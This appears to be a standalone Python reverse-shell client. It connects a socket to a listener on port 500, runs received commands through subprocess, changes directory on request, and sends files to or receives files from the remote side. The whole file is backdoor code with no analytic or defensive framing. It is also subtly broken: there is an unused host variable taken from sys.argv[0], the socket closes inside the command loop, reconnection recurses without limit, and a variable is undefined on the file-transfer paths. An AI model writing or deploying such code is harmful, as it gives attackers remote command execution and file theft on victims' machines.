import socket
import time
import subprocess
import json
import os
import sys

SEVER_HOST = sys.argv[0]
SEVER_PORT = 500
BUFER_SIZE = 1024 * 128
SEPERATOR = "<sep>"
S = socket.socket()
def connn():

    while True:
        time.sleep(1)
        try:
            S.connect(("127.0.0.1", SEVER_PORT))
            con()
        except:
            connn()


def con():

    cmd = os.getcwd()
    S.send(cmd.encode())
    while True:
        command = S.recv(BUFER_SIZE).decode()
        splitted_commmand = command.split()
        if command.lower()  == "exit":
            break
        if splitted_commmand[0].lower() == "cd":
            try:
                os.chdir(" ".join(splitted_commmand[1:]))
            except FileNotFoundError as e:
                output = e
            else: 
                output = ""
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            output = subprocess.getoutput(command)

        cmd = os.getcwd()

        message = f"{output}{SEPERATOR}{cmd}"

        S.send(message.encode())


        S.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    S.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    S.settimeout(1)
    chunk = S.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = S.recv(1024)
        except socket.timeout as e:
            break
    S.settimeout(None)
    f.close()

connn()